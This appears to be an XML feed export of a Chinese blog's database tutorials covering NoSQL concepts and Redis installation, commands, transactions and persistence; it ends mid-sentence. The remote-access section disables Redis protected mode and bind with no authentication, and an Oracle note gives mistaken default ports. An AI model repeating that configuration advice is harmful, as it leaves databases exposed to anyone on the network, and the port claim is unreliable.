title="数据库服务名与网络连接"></a>数据库服务名与网络连接</h3><p>从oracle8i开始的oracle网络组件，数据库与客户端的连接主机串使用数据库服务名。之前用的是ORACLE_SID,即数据库实例名。说一点，服务端默认的端口号一般是389，客户端默认的端口号一般都是1521</p>]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>第1章 NoSQL</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/2f5b619.html</url>
    <content><![CDATA[<h2 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h2><h3 id="什么是NoSQL"><a href="#什么是NoSQL" class="headerlink" title="什么是NoSQL"></a>什么是NoSQL</h3><p>NoSQL = Not Only SQL(不仅仅是SQL),也解释为non-relational(非关系型数据库)。在NoSQL数据库中数据之间是无联系的，无关系的。数据的结构是松散的，可变的。</p><h3 id="为什么使用NoSQL"><a href="#为什么使用NoSQL" class="headerlink" title="为什么使用NoSQL"></a>为什么使用NoSQL</h3><p>关系型数据库的瓶颈:</p><p>1) 无法应对每秒上万次的读写请求，无法处理大量集中的高并发操作。关系型数据的IO密集的应用。硬盘IO也变为性能瓶颈。<br>2) 存储记录数量有限，横向可扩展能力有限，一张表最大两百多列。纵向数据可承受的能力也是有限的，一张表的数据到达百万级，读写的速度就会逐渐的下降。面对海量数据必须使用主从复制，分库分表。这样的系统架构是难以维护的。<br>3) 无法简单地通过增加硬件、服务节点来提高系统性能。数据整个存储在一个数据库中的。多个服务器没有很好的解决办法，来复制这些数据。<br>4) 关系型数据库大多是收费的，对硬件的要求比较高。软件和硬件的成本花费比较重大。</p><h3 id="NoSQL的优势"><a href="#NoSQL的优势" class="headerlink" title="NoSQL的优势"></a>NoSQL的优势</h3><p>(1) 大数据量，高性能<br>NoSQL数据库都具有非常高的读写性能，尤其在大数据量下，同样表现优秀。这得益于它的无关系性，数据库的结构简单。关系型数据库(例如MySQL)使用查询缓存。这种查询缓存在更新数据库后，缓存就是失效的。在频繁的数据读写交互应用中。缓存的性能不高。NoSQL的缓存性能要高的多。</p><p>(2) 灵活的数据模型<br>NoSQL无需事先为要缓存的数据建立字段，随时可以存储自定义的数据格式。而在关系数据库里，增删字段是一件非常麻烦的事情。如果是非常大数据量的表，增加字段简直就是一个噩梦。尤其在快速变化的市场环境中，用户的需求总是在不断变化的。</p><p>(3) 高可用<br>NoSQL在不太影响性能的情况，就可以方便的实现高可用的架构。</p><p>NoSQL能很好的解决关系型数据库扩展性差的问题。弥补了关系数据库(比如MySQL)在某些方面的不足，在某些方面能极大的节省开发成本和维护成本。</p><p>MySQL和NoSQL都有各自的特点和使用的应用场景，两者结合使用。让关系数据库关注在关系上，NoSQL关注在存储上。</p><p>(4) 低成本<br>这是大多数分布式数据库共有的特点，因为主要都是开源软件，没有昂贵的License成本。</p><h3 id="NoSQL的劣势"><a href="#NoSQL的劣势" class="headerlink" title="NoSQL的劣势"></a>NoSQL的劣势</h3><p>(1) 无关系，数据之间是无联系的。<br>(2) 不支持标准的SQL，没有公认的NoSQL标准。<br>(3) 没有关系型数据库的约束，大多数也没有索引的概念。<br>(4) 没有事务，不能依靠事务实现ACID。<br>(5) 没有丰富的数据类型(数值，日期，字符，二进制，大文本等)</p>]]></content>
      <categories>
        <category>数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>第2章 Redis安装和使用</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/3f361f63.html</url>
    <content><![CDATA[<h2 id="Redis安装和使用"><a href="#Redis安装和使用" class="headerlink" title="Redis安装和使用"></a>Redis安装和使用</h2><p>Redis是当今非常流行的基于KV结构的作为Cache使用的NoSQL数据库</p><h3 id="Redis介绍"><a href="#Redis介绍" class="headerlink" title="Redis介绍"></a>Redis介绍</h3><p>Remote Dictionary Server(Redis)是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的Key——Value数据库。Key字符串类型，其值(value)可以是字符串(String),哈希(Map),列表(list),集合(Sets)和有序集合(sorted sets)等类型，每种数据类型有自己专属命令。所以它通常也被称为数据结构服务器。</p><p>Redis的作者是Salvatore Sanfillippo,来自意大利的西西里岛，现在居住在卡塔尼亚。目前供职于Pivotal公司(Pivotal是Spring框架的开发团队)，Salvatore Sanfilippo被称为Redis之父。<br><img src="/images/redis/redis01.png" alt="Redis之父Salvatore Sanfillippo"><br>官网:<a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a><br>中文:<a href="http://www.redis.cn/" target="_blank" rel="noopener">http://www.redis.cn/</a></p><h3 id="Redis的历史"><a href="#Redis的历史" class="headerlink" title="Redis的历史:"></a>Redis的历史:</h3><p>2008年，意大利的一家创业公司Merzia推出了一款基于MySQL的网站实时统计系统LLOOGG，然而没过多久该公司的创始人Salvatore Sanfilippo便开始对MySQL的性能感到失望,于是他决定亲自为LLOOGG量身定做一个数据库，并与2009年完成，这个数据库就是Redis。</p><p>不过Salvatore Sanfilippo并不满足只将Redis用于LLOOGG这一款产品，而是希望让更多的人使用它，于是在同一年Salvatore Sanfilippo将Redis开源发布，并开始和Redis的另一名主要的代码贡献者Pieter Noordhuis一起继续着Redis的开发，直到今天。</p><p>Sanfilippo Salvatore自己也没有想到，短短的几年时间，Redis就拥有了庞大的用户群体。2012年数据库的使用情况调查，结果显示有近12%的公司在使用Redis。国内如新浪微博、知乎，国外如GitHub、Stack Overflow、Flickr、暴雪和Instagram，都是Redis的用户。</p><p>VMware公司从2010年开始赞助Redis的开发，Salvatore Sanfilippo和Pieter Noordhuis也分别于同年的3月和5月加入VMware，全职开发Redis。</p><p>Redis的代码托管在Github上<a href="https://github.com/antirez/redis" title="redis" target="_blank" rel="noopener">https://github.com/antirez/redis</a>,开发十分活跃，代码量只有三万多行。</p><h3 id="Windows-上安装Redis"><a href="#Windows-上安装Redis" class="headerlink" title="Windows 上安装Redis"></a>Windows 上安装Redis</h3><p>Windows版本的Redis是Microsoft的开源部门提供的Redis。这个版本的Redis适合开发人员学习使用，生产环境中使用Linux系统上的Redis。</p><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><a href="https://redis.io/" title="redis" target="_blank" rel="noopener">官网:https://redis.io/</a><br><a href="https://github.com/MSOpenTech/redis/releases" title="redis" target="_blank" rel="noopener">windows版本:https://github.com/MSOpenTech/redis/releases</a></p><p><img src="/images/redis/redis02.png" alt="windows版redis下载"></p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>下载的Redis-x64-3.2.100.zip解压后，放到某个目录(例如D:\redis\),即可使用。目录结构:<br><img src="/images/redis/redis03.png" alt="redis目录结构"></p><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>A、 Windows7系统双击redis-server.exe启动Redis<br><img src="/images/redis/redis04.png" alt="redis启动"><br>B、 Win10系统<br>有的机器双击redis-server.exe执行失败，找不到配置文件，可以采用以下执行方式：在命令行(cmd)中按如下方式执行D:\Redis&gt;redis-server.exe redis.windows.conf<br>如图:<br><img src="/images/redis/redis05.png" alt="redis启动"></p><h4 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h4><p>按ctrl+c退出Redis服务程序。</p><h4 id="添加到服务"><a href="#添加到服务" class="headerlink" title="添加到服务"></a>添加到服务</h4><p>添加：redis-server.exe –service-install redis.windows.conf –service-name redis –port 6379<br>删除:sc delete redis<br>启动:net start redis<br>停止:net stop redis</p><p>当然，由于windows版本redis出现的背景原因，建议在windows下只是测试和学习使用，生产环境最好还是在linux系统下使用。</p><h3 id="Linux-上安装Redis"><a href="#Linux-上安装Redis" class="headerlink" title="Linux 上安装Redis"></a>Linux 上安装Redis</h3><h4 id="下载-1"><a href="#下载-1" class="headerlink" title="下载"></a>下载</h4><p>wget <a href="http://download.redis.io/releases/redis-5.0.3.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-5.0.3.tar.gz</a></p><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>解压缩redis-5.0.3.tar.gz到usr/local目录<br><img src="/images/redis/redis06.png" alt="redis安装"><br>查看解压缩后的文件<br><img src="/images/redis/redis07.png" alt="redis安装"><br>编译Redis文件，Redis是使用C语言编写的。会使用gcc编译器。<br>在解压后的Redis目下执行(cd /usr/local/redis-5.0.3)make命令。</p><p>注意事项:<br>1) make命令执行过程中可能保存，根据控制台数据的错误信息进行解决<br>2) 错误一： gcc命令找不到，是由于没有安装gcc导致<br>解决方式:安装gcc编译器后在执行make命令。<br>什么是gcc?<br>gcc是GNU compiler collection的缩写，它是linux下一个编辑器集合(相当于javac)，是c或c++程序的编译器。<br>怎么安装gcc？<br>使用yum进行安装gcc。执行命令： yum -y install gcc<br>3) 错误二： error：jemalloc/jemalloc.h: No such file or directory<br>解决方式执行make MALLOC=libc</p><p>开始执行make<br>注意:在make执行之后再执行make install,该操作则将src下的许多可执行文件复制/usr/local/bin目录下，这样做可以在任意目录执行redis的软件的命令(例如启动,停止，客户端连接服务器等)，make install可以不用执行，看个人习惯。</p><p>查看make编译结果，cd src目录<br><img src="/images/redis/redis08.png" alt="redis编译"><br>cd src在执行ls<br><img src="/images/redis/redis09.png" alt="redis编译"></p><h4 id="启动Redis"><a href="#启动Redis" class="headerlink" title="启动Redis"></a>启动Redis</h4><p>前台启动 ./redis-server<br>后台启动 ./redis-server &amp;<br>查看redis启动进程 ps -ef | grep redis</p><h4 id="关闭Redis"><a href="#关闭Redis" class="headerlink" title="关闭Redis"></a>关闭Redis</h4><p>关闭方式:<br>1) 使用redis客户端关闭，向服务器发出关闭命令。切换到redis-3.2.9/src/目录，执行./redis-cli shutdown<br>推荐使用这种方式，redis先完成数据操作，然后再关闭。<br>例如:<br><img src="/images/redis/redis10.png" alt="redis关闭"><br>2) kill pid或者kill -9 pid<br>这种不会考虑当前应用是否有数据库正在执行操作，直接就关闭应用。<br>先使用ps -ef | grep redis查出进程号，在使用kill pid<br><img src="/images/redis/redis11.png" alt="redis关闭"></p><h3 id="Redis客户端"><a href="#Redis客户端" class="headerlink" title="Redis客户端"></a>Redis客户端</h3><p>Redis客户端是一个程序，通过网络连接到Redis服务器，在客户端软件中使用Redis可以识别的命令，向Redis服务器发送命令，告诉Redis想要做什么。Redis把处理结果显示在客户端界面上。通过Redis客户端和Redis服务器交互。<br>Redis客户端发送命令，同时显示Redis服务器的处理结果。</p><h4 id="redis命令行客户端："><a href="#redis命令行客户端：" class="headerlink" title="redis命令行客户端："></a>redis命令行客户端：</h4><p>redis-cli(Redis Command Line Interface)是Redis自带的基于命令行的Redis客户端，用于与服务器端交互，我们可以使用该客户端来执行redis锋各种命令。两种常用的连接方式:</p><p>A、 直接连接redis(默认ip127.0.0.1，端口6379)： ./redis-cli<br>在redis安装目录\src,执行./redis-cli<br>此命令式连接本机127.0.0.1，端口6379的redis</p><p>B、 指定IP和端口连接redis: ./redis-cli -h 127.0.0.1 -p 6379<br>-h redis 主机 IP(可以指定任意的redis服务器)<br>-p 端口号(不同端口表示不同的应用)</p><h4 id="redis远程客户端"><a href="#redis远程客户端" class="headerlink" title="redis远程客户端"></a>redis远程客户端</h4><p>Redis Desktop Manager： C++编写，响应迅速，性能好。<br><a href="https://redisdesktop.com/" title="Redis Desktop Manager" target="_blank" rel="noopener">官网地址： https://redisdesktop.com/</a><br><a href="https://github.com/uglide/RedisDesktopManager" title="Redis Desktop Manager github" target="_blank" rel="noopener">github： https://github.com/uglide/RedisDesktopManager</a><br><a href="http://docs.redisdesktop.com/en/latest/" title="使用文档" target="_blank" rel="noopener">使用文档： http://docs.redisdesktop.com/en/latest/</a><br><img src="/images/redis/redis12.png" alt="Redis Desktop Manager"><br>点击 “DOWNLOAD”<br><img src="/images/redis/redis13.png" alt="Redis Desktop Manager"></p><h5 id="安装客户端软件"><a href="#安装客户端软件" class="headerlink" title="安装客户端软件"></a>安装客户端软件</h5><p>在windows系统使用此工具，连接Linux上或Windows上的Redis,双击此exe文件执行安装。<br><img src="/images/redis/redis14.png" alt="Redis Desktop Manager"><br>安装后启动界面:<br><img src="/images/redis/redis15.png" alt="Redis Desktop Manager"></p><h5 id="使用客户端连接Linux的Redis"><a href="#使用客户端连接Linux的Redis" class="headerlink" title="使用客户端连接Linux的Redis"></a>使用客户端连接Linux的Redis</h5><p>连接Linux的Redis之前需要修改Redis服务器的配置信息。Redis服务器有安全保护措施，默认只有本机(安装Redis的那台机器)能够访问。配置信息存放在Redis安装目录下的redis.conf文件。修改此文件的两个设置。<br>远程连接redis需要修改redis注目下的redis.conf配置文件:<br>1) bing ip 绑定ip此行注释<br>2）protected-mode yes 保护模式改为no<br>使用vim命令修改redis.conf文件，修改此文件前备份此文件，执行cp命令<br><img src="/images/redis/redis16.png" alt="Redis配置"><br>执行vm redis.conf<br><img src="/images/redis/redis17.png" alt="Redis配置"></p><h5 id="使用redis-conf启动redis"><a href="#使用redis-conf启动redis" class="headerlink" title="使用redis.conf启动redis"></a>使用redis.conf启动redis</h5><p>修改配置文件后，需要使用配置文件重新启动Redis，默认不加载配置文件。先关闭已启动的Redis，使用一下命令启动Redis在Redis安装目录执行:<br>./redis-server ../redis.conf &amp;<br><img src="/images/redis/redis18.png" alt="Redis配置"></p><h5 id="配置Redis-Desktop-Manager-RDM-连接Redis"><a href="#配置Redis-Desktop-Manager-RDM-连接Redis" class="headerlink" title="配置Redis Desktop Manager(RDM),连接Redis"></a>配置Redis Desktop Manager(RDM),连接Redis</h5><p>在RDM的主窗口，点击左下的”Connect to Redis Server”<br><img src="/images/redis/redis19.png" alt="Redis"><br>连接成功后:<br><img src="/images/redis/redis20.png" alt="Redis"></p><h4 id="redis编程客户端"><a href="#redis编程客户端" class="headerlink" title="redis编程客户端"></a>redis编程客户端</h4><h5 id="Jedis"><a href="#Jedis" class="headerlink" title="Jedis"></a>Jedis</h5><p>redis的Java编程客户端，Redis官方首先推荐使用Jedis，jedis是一个很小但很健全的redis的Java客户端。通过Jedis可以像使用Redis命令行一样使用Redis。</p><ul><li>jedis完全兼容redis 2.8.x and 3.x.x</li><li>jedis源码： <a href="https://github.com/xetorthio/jedis" target="_blank" rel="noopener">https://github.com/xetorthio/jedis</a></li><li>api文档: <a href="http://xetorthio.github.io/jedis/" target="_blank" rel="noopener">http://xetorthio.github.io/jedis/</a></li></ul><h5 id="redis的其他编程语言客户端"><a href="#redis的其他编程语言客户端" class="headerlink" title="redis的其他编程语言客户端"></a>redis的其他编程语言客户端</h5><p>C、C++、C#、Erlang、Lua、Objective-C、Perl、PHP、Python、Ruby、Scala、Go等40多种语言都有连接redis的编程客户端。</p><h3 id="Redis的基本操作命令"><a href="#Redis的基本操作命令" class="headerlink" title="Redis的基本操作命令"></a>Redis的基本操作命令</h3><p>redis默认为16个库(在redis.conf文件可以配置，该文件很重要，后续很多操作都是这个配置文件)redis默认自动使用0号库。</p><h4 id="沟通命令，查看状态"><a href="#沟通命令，查看状态" class="headerlink" title="沟通命令，查看状态"></a>沟通命令，查看状态</h4><p>redis&gt;ping 返回PONG<br>解释: 输入ping，redis给我们返回PONG，表示redis服务运行正常。<br><img src="/images/redis/redis21.png" alt="Redis"></p><h4 id="查看当前数据库中的key的数目：dbsize"><a href="#查看当前数据库中的key的数目：dbsize" class="headerlink" title="查看当前数据库中的key的数目：dbsize"></a>查看当前数据库中的key的数目：dbsize</h4><p>语法:dbsize<br>作用:返回当前数据库的key的数量。<br>返回值:数字，key的数量<br>例:先查索引5的key个数，在查0库的key个数<br><img src="/images/redis/redis22.png" alt="Redis"></p><h4 id="redis默认使用16个库"><a href="#redis默认使用16个库" class="headerlink" title="redis默认使用16个库"></a>redis默认使用16个库</h4><p>Redis默认使用16个库，从0到15。对数据库个数的修改，在redis.conf文件中databases 16<br><img src="/images/redis/redis23.png" alt="Redis"></p><h4 id="切换库命令-select-db"><a href="#切换库命令-select-db" class="headerlink" title="切换库命令: select db"></a>切换库命令: select db</h4><p>使用其他数据库，命令是select index<br>例如:select 5<br><img src="/images/redis/redis24.png" alt="Redis"></p><h4 id="删除当前库的数据-flushdb"><a href="#删除当前库的数据-flushdb" class="headerlink" title="删除当前库的数据:flushdb"></a>删除当前库的数据:flushdb</h4><p><img src="/images/redis/redis25.png" alt="Redis"></p><h4 id="redis自带的客户端退出当前redis连接-exit或quit"><a href="#redis自带的客户端退出当前redis连接-exit或quit" class="headerlink" title="redis自带的客户端退出当前redis连接:exit或quit"></a>redis自带的客户端退出当前redis连接:exit或quit</h4><p><img src="/images/redis/redis26.png" alt="Redis"></p><h3 id="Redis的Key的操作命令"><a href="#Redis的Key的操作命令" class="headerlink" title="Redis的Key的操作命令"></a>Redis的Key的操作命令</h3><h4 id="keys-pattern"><a href="#keys-pattern" class="headerlink" title="keys pattern"></a>keys pattern</h4><p>作用: 查找所有符合模式pattern的key。pattern可以使用通配符。<br>通配符:</p><ul><li>*:表示0-多个字符，例如：keys *查询所有key。</li><li>？:表示单个字符，例如：wo？d，匹配word，wood等。</li></ul><p>例1:显示所有的key<br><img src="/images/redis/redis27.png" alt="Redis"><br>例2:使用*表示0或多个字符<br><img src="/images/redis/redis28.png" alt="Redis"><br>例3:使用？表示单个字符<br><img src="/images/redis/redis29.png" alt="Redis"></p><h4 id="exists"><a href="#exists" class="headerlink" title="exists"></a>exists</h4><p>语法:exists key [key···]<br>作用:判断key是否存在<br>返回值:整数，存在key返回1，其他返回0。使用多个key，返回存在的key的数量。<br>例1:检查指定key是否存在<br><img src="/images/redis/redis30.png" alt="Redis"><br>例2:检查多个key<br><img src="/images/redis/redis31.png" alt="Redis"></p><h4 id="expire"><a href="#expire" class="headerlink" title="expire"></a>expire</h4><p>语法:expire key seconds<br>作用:设置key的生存时间，超过时间，key自动删除。单位是秒。<br>返回值:设置成功返回数字1，其他情况是0。<br>例1: 设置红灯的倒计时是5秒<br><img src="/images/redis/redis32.png" alt="Redis"></p><h4 id="ttl"><a href="#ttl" class="headerlink" title="ttl"></a>ttl</h4><p>语法:ttl key<br>作用:以秒为单位，返回key的剩余生存时间(ttl:time to live)<br>返回值:</p><ul><li>-1:没有设置key的生存时间，key永不过期。</li><li>-2:key不存在</li><li>数字:key的剩余时间，秒为单位。<br>例1:设置redlight的过期时间是10s，查看剩余时间<br><img src="/images/redis/redis33.png" alt="Redis"></li></ul><h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p>语法:type key<br>作用:查看key所存储值得数据类型<br>返回值:字符串表示的数据类型</p><ul><li>none(key不存在)</li><li>string(字符串)</li><li>list(列表)</li><li>set(集合)</li><li>zset(有序集)</li><li>hash(哈希表)</li></ul><p>例1:查看存储字符串的key: wood<br><img src="/images/redis/redis34.png" alt="Redis"><br>例2:查看不存在的key<br><img src="/images/redis/redis35.png" alt="Redis"></p><h4 id="del"><a href="#del" class="headerlink" title="del"></a>del</h4><p>语法:del key [key···]<br>作用:删除存在的key，不存在的key忽略。<br>返回值:数字，删除的key的数量。</p><p>例1:删除指定的key<br><img src="/images/redis/redis36.png" alt="Redis"></p><h3 id="Redis的5种数据类型"><a href="#Redis的5种数据类型" class="headerlink" title="Redis的5种数据类型"></a>Redis的5种数据类型</h3><h4 id="字符串类型-string"><a href="#字符串类型-string" class="headerlink" title="字符串类型 string"></a>字符串类型 string</h4><p>字符串类型是Redis中最基本的数据类型，它能存储任何形式的字符串，包括二进制数据，序列化后的数据，JSON化的对象甚至是一张图片。最大512M。<br><img src="/images/redis/redis37.png" alt="Redis"></p><h4 id="哈希类型-hash"><a href="#哈希类型-hash" class="headerlink" title="哈希类型 hash"></a>哈希类型 hash</h4><p>Redis hash是一个string类型的field和value的映射表，hash特别适合用于存储对象。<br><img src="/images/redis/redis38.png" alt="Redis"></p><h4 id="列表类型-list"><a href="#列表类型-list" class="headerlink" title="列表类型 list"></a>列表类型 list</h4><p>Redis列表时简单的字符串类别，按照插入顺序排序。你可以添加一个元素到列表的头部(左边)或者尾部(右边)。<br><img src="/images/redis/redis39.png" alt="Redis"></p><h4 id="集合类型-set"><a href="#集合类型-set" class="headerlink" title="集合类型 set"></a>集合类型 set</h4><p>Redis的Set是string类型的无序集合，集合成员是唯一的，即集合中不能出现重复数据。<br><img src="/images/redis/redis40.png" alt="Redis"></p><h4 id="有序集合类型-zset-sorted-set"><a href="#有序集合类型-zset-sorted-set" class="headerlink" title="有序集合类型 zset(sorted set)"></a>有序集合类型 zset(sorted set)</h4><p>Redis有序集合zset和集合set一样是string类型元素的集合，且不允许重复的成员。不同的是zset的每个元素都会关联一个分数(分数可以重复)，redis通过分数来为集合中的成员进行从小到大的排序。<br><img src="/images/redis/redis41.png" alt="Redis"></p>]]></content>
      <categories>
        <category>数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>第4章 高级话题</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/e36135cb.html</url>
    <content><![CDATA[<h3 id="Redis事物"><a href="#Redis事物" class="headerlink" title="Redis事物"></a>Redis事物</h3><h4 id="什么是事物"><a href="#什么是事物" class="headerlink" title="什么是事物"></a>什么是事物</h4><p>事物是指一系列操作步骤，这一系列的操作步骤，要么完全地执行，要么完全地不执行。<br>Redis中的事物(transaction)是一组命令的集合，至少是两个或两个以上的命令，redis事物保证这些命令被执行时中间不会被任何其他操作打断。</p><h4 id="事物操作的命令"><a href="#事物操作的命令" class="headerlink" title="事物操作的命令"></a>事物操作的命令</h4><h5 id="multi"><a href="#multi" class="headerlink" title="multi"></a>multi</h5><p>语法: multi<br>作用: 标记一个事物的开始。事物内的多条命令会按照先后顺序被放到一个队列当中。<br>返回值: 总是返回OK</p><h5 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h5><p>语法: exec<br>作用: 执行所有事物块内的命令<br>返回值: 事物内的所有执行语句内容，事物被打断(影响)返回nil</p><h5 id="discard"><a href="#discard" class="headerlink" title="discard"></a>discard</h5><p>语法: discard<br>作用: 取消事物，放弃执行事物块内的所有命令<br>返回值: 总是返回OK</p><h5 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h5><p>语法: watch key [key···]<br>作用: 监视一个(或多个)key，如果在事物执行之前这个(或这些)key被其他命令所改动，那么事物将被打断。<br>返回值: 总是返回OK</p><h5 id="unwatch"><a href="#unwatch" class="headerlink" title="unwatch"></a>unwatch</h5><p>语法: unwatch<br>作用: 取消WATCH命令对所有key的监视。如果在执行WATCH命令之后，EXEC命令或DISCARD命令先被执行了的话，那么就不需要在执行UNWATCH了<br>返回值: 总是返回OK</p><h4 id="事物的实现"><a href="#事物的实现" class="headerlink" title="事物的实现"></a>事物的实现</h4><h5 id="正常执行事物"><a href="#正常执行事物" class="headerlink" title="正常执行事物"></a>正常执行事物</h5><p>事物的执行步骤: 首先开启事物，其次向事物队列中加入命令，最后执行事物提交。<br>例1: 事物的执行：<br>1) multi：用multi命令告诉Redis，接下来要执行的命令你先不要执行，而是把它们暂时存起来(开启事物)<br>2) sadd works john 第一条命令进入等待队列(命令入队)<br>3) sadd works rose 第二条命令进入等待队列(命令入队)<br>4) exce 告知redis执行前面发送的两条命令(提交事物)<br><img src="/images/redis/redis123.png" alt="Redis"><br>查看works集合<br><img src="/images/redis/redis124.png" alt="Redis"></p><h5 id="事物执行exec之前，入队命令错误-语法错误；严重错误导致服务器不能正常工作-例如内存不足-放弃事物。"><a href="#事物执行exec之前，入队命令错误-语法错误；严重错误导致服务器不能正常工作-例如内存不足-放弃事物。" class="headerlink" title="事物执行exec之前，入队命令错误(语法错误；严重错误导致服务器不能正常工作(例如内存不足)),放弃事物。"></a>事物执行exec之前，入队命令错误(语法错误；严重错误导致服务器不能正常工作(例如内存不足)),放弃事物。</h5><p>执行事物步骤:<br>1) MULTI 正常命令<br>2) SET key value 正常命令<br>3) INCR 命令语法错误<br>4) EXEC 无法执行事物，那么第一条正确的命令也不会执行，所有key的值不会设置成功。<br><img src="/images/redis/redis125.png" alt="Redis"><br>结论: 事物执行exec之前，入队命令错误，事物终止，取消，不执行。</p><h5 id="事物执行exec命令后，执行队列命令，命令执行错误，事物提交"><a href="#事物执行exec命令后，执行队列命令，命令执行错误，事物提交" class="headerlink" title="事物执行exec命令后，执行队列命令，命令执行错误，事物提交"></a>事物执行exec命令后，执行队列命令，命令执行错误，事物提交</h5><p>执行步骤:<br>1) MULTI 正常命令<br>2) SET username zhangsan 正常命令<br>3) lpop username 正常命令，语法没有错误，执行命令时才会有错误<br>4) EXEC正常执行，发现错误可以在事物提交前放弃事物，执行discard<br><img src="/images/redis/redis126.png" alt="Redis"><br>结论: 在exec执行后的所产生的错误，即使事物中有某个/某些命令在执行时产生了错误，事物中的其他命令仍然会继续执行。</p><p>Redis在事物失败时不进行回滚，而是继续执行余下的命令。</p><p>Redis这种设计原则是: Redis命令只会因为错误的语法而失败(这些问题不能在入队时发现)，或是命令用在了错误类型的键上面，失败的命令并不是Redis导致，而是由编程错误造成的，这样的错误还应该在开发中被发现，生产环境中不应出现语法的错误。就是在程序的运行环境中不应该出现语法的错误。而Redis能够保证正确的命令一定会被执行。再者不需要对回滚进行支持，所以Redis的内部可以保持简单且快速。</p><h5 id="放弃事物"><a href="#放弃事物" class="headerlink" title="放弃事物"></a>放弃事物</h5><p>1) MULTI开启事物<br>2) SET age 35 命令入队<br>3) SET age 30 命令入队<br>4) DISCARD 放弃事物，则命令队列不会被执行<br>例1:<br><img src="/images/redis/redis127.png" alt="Redis"></p><h5 id="Redis的watch机制"><a href="#Redis的watch机制" class="headerlink" title="Redis的watch机制"></a>Redis的watch机制</h5><h6 id="Redis的WATCH机制"><a href="#Redis的WATCH机制" class="headerlink" title="Redis的WATCH机制"></a>Redis的WATCH机制</h6><p>WATCH机制原理:<br>WATCH机制: 使用WATCH监视一个或多个key，跟踪key的value修改情况，如果有ley的value值在事物EXEC执行之前被修改了，整个事物被取消。EXEC返回提示信息，表示事物已经失败。</p><p>WATCH机制使的事物EXEC变得有条件，事物只有在被WATCH的key没有修改的前提下才能执行。不满足条件，事物被取消。使用WATCH监视了一个带过期时间的键，那么即使这个键过期了，事物任然可以正常执行。</p><p>大多数情况下，不同的客户端会访问不同的键，相互同时竞争同一key的情况一般都很少，乐观锁能够以很好的性能解决数据冲突的问题。</p><h6 id="何时取消key的监视-WATCH"><a href="#何时取消key的监视-WATCH" class="headerlink" title="何时取消key的监视(WATCH)?"></a>何时取消key的监视(WATCH)?</h6><p>1) WATCH命令可以被调用多次。对键的监视从WATCH执行之后开始生效，直到调用EXEC为止。不管事物是否成功执行，对所有键的监视都会被取消。<br>2) 当客户端断开连接时，该客户端对键的监视也会被取消。<br>3) UNWATCH命令可以手动取消对所有键的监视。</p><h6 id="WATCH的事例"><a href="#WATCH的事例" class="headerlink" title="WATCH的事例"></a>WATCH的事例</h6><p>执行步骤:<br>首先启动redis-server,在看起两个客户端连接。分别叫A客户端和B客户端。<br>启动Redis服务器<br><img src="/images/redis/redis128.png" alt="Redis"><br>A客户端(红色): WATCH某个key，同时执行事务<br><img src="/images/redis/redis129.png" alt="Redis"><br>B客户端(黄色): 对A客户端WATCH的key修改其value值。<br><img src="/images/redis/redis130.png" alt="Redis"></p><p>1) 在A客户端设置key:str.lp登录人数为10<br>2) 在A客户端监视key:str.lp<br>3) 在A客户端开启事物 multi<br>4) 在A客户端修改 str.lp的值为11<br>5) 在B客户端修改 str.lp的值为15<br>6) 在A客户端执行事物 exec<br>7) 在A客户端查看 str.lp的值，A客户端执行的事物没有提交，因为WATCH的str.lp的值已经被修改了，所以放弃事物。</p><p>例1: 乐观锁<br><img src="/images/redis/redis131.png" alt="Redis"></p><h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><h4 id="持久化概述"><a href="#持久化概述" class="headerlink" title="持久化概述"></a>持久化概述</h4><p>持久化可以理解为存储，就是将数据存储到一个不会丢失的地方，如果把数据放在内存中，电脑关闭或重启数据就会丢失，所以放在内存中的数据不是持久化的，而放在磁盘就算是一种持久化。</p><p>Redis的数据存储在内存中，内存是顺势的，如果linux宕机或重启，又或者Redis崩溃或重启，所有的内存数据都会丢失，为解决这个问题，Redis提供两种机制对数据进行持久化存储，便于发生故障后能迅速恢复数据。</p><h4 id="持久化方式"><a href="#持久化方式" class="headerlink" title="持久化方式"></a>持久化方式</h4><h5 id="RDB方式"><a href="#RDB方式" class="headerlink" title="RDB方式"></a>RDB方式</h5><h6 id="什么是RDB方式"><a href="#什么是RDB方式" class="headerlink" title="什么是RDB方式?"></a>什么是RDB方式?</h6><p>Redis Database(RDB)，就是在指定的时间间隔内将内存中的数据集快照写入磁盘，数据恢复时将快照文件直接再读到内存。<br>RDB保存了在某个时间点的数据集(全部数据)。存储在一个二进制文件中，只有一个文件。默认是dump.rdb。RDB技术非常适合做备份，可以保存最近一个小时，一天，一个月的全部数据。保存数据是在单独的进程中写文件，不影响Redis的正常使用。RDB恢复数据时比其他AOF速度快。</p><h6 id="如何实现"><a href="#如何实现" class="headerlink" title="如何实现?"></a>如何实现?</h6><p>RDB方式的数据持久化，仅需在redis.conf文件中配置即可，默认配置是启用的。<br>在配置文件redis.conf中搜索SNAPSHOTTING，查找在注释开始和结束文件的关于RDB的配置说明。配置SNAPSHOTTING的地方有三处。<br>1) 配置执行RDB生成快照文件的时间策略。<br>对Redis进行设置，让它在“N秒内数据集至少有M个key改动”这一条件被满足时，自动保存一次数据集。<br>配置格式: save &lt;seconds&gt; &lt;changes&gt;<br>save 900 1<br>save 300 10<br>save 60 10000<br>2) dbfilename： 设置RDB的文件名，默认文件名为dump.rdb<br>3) dir: 